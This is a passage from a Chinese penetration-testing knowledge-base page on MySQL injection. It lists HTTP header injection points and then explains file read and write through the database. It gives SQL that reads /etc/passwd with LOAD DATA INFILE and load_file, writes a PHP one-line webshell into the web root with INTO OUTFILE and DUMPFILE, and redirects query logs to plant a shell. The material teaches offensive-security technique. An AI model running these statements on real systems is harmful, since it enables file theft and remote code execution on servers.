<p>​	因为http头注入常出现在收集用户信息的点，所以常见的注入点如下：</p>
<table><thead><tr><th>Header</th><th>说明</th></tr></thead><tbody><tr><td>X-Forwarded-For/Client-IP</td><td>用户IP</td></tr><tr><td>User-Agent</td><td>用户代理的设备信息</td></tr><tr><td>Referer</td><td>告诉服务器该网页是从哪个页面链接过来的</td></tr><tr><td>Cookie</td><td>标识用户的身份信息</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="其他文件读写">其他：文件读写<a href="#其他文件读写" class="hash-link" aria-label="其他：文件读写的直接链接" title="其他：文件读写的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置问题">配置问题<a href="#配置问题" class="hash-link" aria-label="配置问题的直接链接" title="配置问题的直接链接">​</a></h3>
<p>Mysql是很灵活的，它支持文件读/写功能；在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</p>
<p>简单的说：<code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述SQL语句查询权限。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> file_priv </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">$</span><span class="token keyword" style="color:#00009f">USER</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> host</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">$HOST</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> file_priv </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;root&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> host</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;localhost&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> file_priv </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> host</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> host </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mysql</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">user</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222140617466" src="/assets/images/image-20211222140617466-4a6d55311a59d2200652be11f7208d64.png" width="1602" height="308" class="img_ev3q"></p>
<hr>
<p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。</p>
<ul>
<li>可通过如下两种方法查询<code>secure-file-priv</code>的值</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;secure_file_priv&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%secure_file_priv%&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<ul>
<li>
<p>值具体说明如下：</p>
<ul>
<li>为NULL，表示禁止文件读/写</li>
<li>空白内容，表示无限制</li>
<li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>Mysql &gt;= 5.5.53版本默认值为NULL，之前的版本空白内容</strong>。</p>
</blockquote>
<ul>
<li>修改<code>secure-file-priv</code>值：<!-- -->
<ul>
<li>通过修改<code>my.ini</code>文件，添加：<code>secure-file-priv=</code></li>
<li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="读文件">读文件<a href="#读文件" class="hash-link" aria-label="读文件的直接链接" title="读文件的直接链接">​</a></h3>
<p>在确定了用户有读，写权限之后，一般使用<code>load_file()</code>函数来读取文件内容</p>
<p><strong>限制条件：</strong></p>
<ul>
<li>
<p>前两种需要<code>secure-file-priv</code>无值或为有利目录;</p>
</li>
<li>
<p>都需要知道要读取的文件所在的绝对路径;</p>
</li>
<li>
<p>要读取的文件大小必须小于系统变量<code>max_allowed_packet</code>所设置的值</p>
</li>
</ul>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> load_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">file_path</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- file_path为绝对路径</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222141458835" src="/assets/images/image-20211222141458835-ecece10c0e0adc0843062c7aa5284666.png" width="1640" height="1826" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">load</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">data</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">infile</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/etc/passwd&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> test </span><span class="token keyword" style="color:#00009f">FIELDS</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TERMINATED</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 读取服务端上的文件</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211222142007659" src="/assets/images/image-20211222142007659-182becfedb19ef9235674e1d7c063e89.png" width="1734" height="2118" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">load</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">data</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">local</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">infile</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;/etc/passwd&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> test </span><span class="token keyword" style="color:#00009f">FIELDS</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TERMINATED</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">BY</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 读取客户端上的文件</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="写文件">写文件<a href="#写文件" class="hash-link" aria-label="写文件的直接链接" title="写文件的直接链接">​</a></h3>
<p>常规写文件主要利用了 <code>into outfile</code> 和 <code>into dumpfile</code></p>
<p><strong>限制条件：</strong></p>
<ul>
<li>
<p><code>secure-file-priv</code>无值或为可利用的目录</p>
</li>
<li>
<p>需知道目标目录的绝对路径</p>
</li>
<li>
<p>目标目录可写，mysql的权限足够</p>
</li>
</ul>
<p><strong><code>outfile</code>和<code>dumpfile</code>区别：</strong></p>
<ul>
<li><code>into outfile</code> 是导出所有数据，适合导出库，但是如果用它去导出二进制文件时，就会出错，因为<code>outfile</code>函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏</li>
<li><code>into dumpfile</code> 只能导出一行数据，一般导出导出二进制文件(<code>udf提权</code>)时就用<code>dumpfile</code></li>
</ul>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&lt;?php @assert($_POST[&#x27;t&#x27;]);?&gt;&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">outfile</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;/var/www/html/1.php&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&lt;?php @assert($_POST[&#x27;t&#x27;]);?&gt;&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">dumpfile</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;/var/www/html/1.php&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="日志getshell">日志getshell<a href="#日志getshell" class="hash-link" aria-label="日志getshell的直接链接" title="日志getshell的直接链接">​</a></h3>
<p>由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p>
<p><strong>限制条件：</strong></p>
<p>限制：</p>
<ul>
<li>权限够，可以进行日志的设置操作（执行<code>set</code>语句）</li>
<li>知道目标目录的绝对路径</li>
</ul>
<p>mysql日志文件的一些相关设置可以直接通过命令来进行</p>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 请求日志</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;/var/www/html/1.php&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">on</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 慢查询日志</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> slow_query_log_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;/var/www/html/2.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mysql</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> slow_query_log</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 还有其他很多日志都可以进行利用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ...</span><br></span></code></pre></div></div>
<p>之后让数据库执行满足记录条件的恶意语句即可，具体可查看<code>phpmyadmin</code>通过日志写入webshell相关的教程</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/常用符号:函数:语句归类"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">常用符号:函数:语句归类</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/WEB漏洞/SQL注入/MySQL/绕过技巧"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">绕过技巧</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#前情提要" class="table-of-contents__link toc-highlight">前情提要</a></li><li><a href="#联合union查询注入" class="table-of-contents__link toc-highlight">联合(UNION)查询注入</a><ul><li><a href="#概念" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#注意" class="table-of-contents__link toc-highlight">注意</a></li><li><a href="#注入流程" class="table-of-contents__link toc-highlight">注入流程</a></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li><li><a href="#扩展limit注入点字段数判断" class="table-of-contents__link toc-highlight">扩展：limit注入点字段数判断</a></li></ul></li><li><a href="#报错注入" class="table-of-contents__link toc-highlight">报错注入</a><ul><li><a href="#概念-1" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#注意-1" class="table-of-contents__link toc-highlight">注意</a></li><li><a href="#注入流程-1" class="table-of-contents__link toc-highlight">注入流程</a></li><li><a href="#报错函数" class="table-of-contents__link toc-highlight">报错函数</a><ul><li><a href="#floor" class="table-of-contents__link toc-highlight">floor()</a></li><li><a href="#extractvalue" class="table-of-contents__link toc-highlight">extractValue()</a></li><li><a href="#updatexml" class="table-of-contents__link toc-highlight">updatexml()</a></li><li><a href="#exp" class="table-of-contents__link toc-highlight">exp()</a></li><li><a href="#gtid相关函数" class="table-of-contents__link toc-highlight">GTID相关函数</a></li><li><a href="#st相关函数" class="table-of-contents__link toc-highlight">ST相关函数</a></li><li><a href="#几何函数" class="table-of-contents__link toc-highlight">几何函数</a></li><li><a href="#bigint" class="table-of-contents__link toc-highlight">BIGINT</a></li><li><a href="#uuid相关函数" class="table-of-contents__link toc-highlight">uuid相关函数</a></li><li><a href="#不存在的函数" class="table-of-contents__link toc-highlight">不存在的函数</a></li><li><a href="#name_const" class="table-of-contents__link toc-highlight">name_const()</a></li><li><a href="#join-using" class="table-of-contents__link toc-highlight">join using</a></li></ul></li></ul></li><li><a href="#盲注" class="table-of-contents__link toc-highlight">盲注</a><ul><li><a href="#布尔盲注" class="table-of-contents__link toc-highlight">布尔盲注</a><ul><li><a href="#概念-2" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#常用函数" class="table-of-contents__link toc-highlight">常用函数</a></li><li><a href="#注入流程-2" class="table-of-contents__link toc-highlight">注入流程</a></li><li><a href="#常见语句" class="table-of-contents__link toc-highlight">常见语句</a></li><li><a href="#总结-1" class="table-of-contents__link toc-highlight">总结</a></li><li><a href="#扩展基于正则的盲注" class="table-of-contents__link toc-highlight">扩展：基于正则的盲注</a></li><li><a href="#扩展未知列名的盲注" class="table-of-contents__link toc-highlight">扩展：未知列名的盲注</a></li></ul></li><li><a href="#时间盲注" class="table-of-contents__link toc-highlight">时间盲注</a><ul><li><a href="#概念-3" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#应用场景" class="table-of-contents__link toc-highlight">应用场景</a></li><li><a href="#常用函数-1" class="table-of-contents__link toc-highlight">常用函数</a></li><li><a href="#常见语句-1" class="table-of-contents__link toc-highlight">常见语句</a></li></ul></li></ul></li><li><a href="#dns注入简化盲注" class="table-of-contents__link toc-highlight">DNS注入（简化盲注）</a><ul><li><a href="#概念-4" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#应用场景-1" class="table-of-contents__link toc-highlight">应用场景</a></li><li><a href="#利用语句" class="table-of-contents__link toc-highlight">利用语句</a></li></ul></li><li><a href="#order-by注入" class="table-of-contents__link toc-highlight">order by注入</a><ul><li><a href="#概念-5" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#判定存在" class="table-of-contents__link toc-highlight">判定存在</a></li><li><a href="#利用语句-1" class="table-of-contents__link toc-highlight">利用语句</a></li></ul></li><li><a href="#limit注入" class="table-of-contents__link toc-highlight">limit注入</a><ul><li><a href="#无order-by" class="table-of-contents__link toc-highlight">无order by</a></li><li><a href="#有order-by" class="table-of-contents__link toc-highlight">有order by</a></li></ul></li><li><a href="#二次注入" class="table-of-contents__link toc-highlight">二次注入</a><ul><li><a href="#概念-6" class="table-of-contents__link toc-highlight">概念</a></li><li><a href="#利用分析" class="table-of-contents__link toc-highlight">利用分析</a></li><li><a href="#利用过程" class="table-of-contents__link toc-highlight">利用过程</a></li></ul></li><li><a href="#宽字节注入" class="table-of-contents__link toc-highlight">宽字节注入</a><ul><li><a href="#魔术引号" class="table-of-contents__link toc-highlight">魔术引号</a></li><li><a href="#编码字符集" class="table-of-contents__link toc-highlight">编码字符集</a></li><li><a href="#概述" class="table-of-contents__link toc-highlight">概述</a></li><li><a href="#流程分析" class="table-of-contents__link toc-highlight">流程分析</a></li><li><a href="#注入语句" class="table-of-contents__link toc-highlight">注入语句</a></li><li><a href="#扩展" class="table-of-contents__link toc-highlight">扩展</a></li></ul></li><li><a href="#update注入" class="table-of-contents__link toc-highlight">Update注入</a></li><li><a href="#false注入" class="table-of-contents__link toc-highlight">False注入</a></li><li><a href="#堆叠注入" class="table-of-contents__link toc-highlight">堆叠注入</a></li><li><a href="#http头部注入" class="table-of-contents__link toc-highlight">HTTP头部注入</a></li><li><a href="#其他文件读写" class="table-of-contents__link toc-highlight">其他：文件读写</a><ul><li><a href="#配置问题" class="table-of-contents__link toc-highlight">配置问题</a></li><li><a href="#读文件" class="table-of-contents__link toc-highlight">读文件</a></li><li><a href="#写文件" class="table-of-contents__link toc-highlight">写文件</a></li><li><a href="#日志getshell" class="table-of-contents__link toc-highlight">日志getshell</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>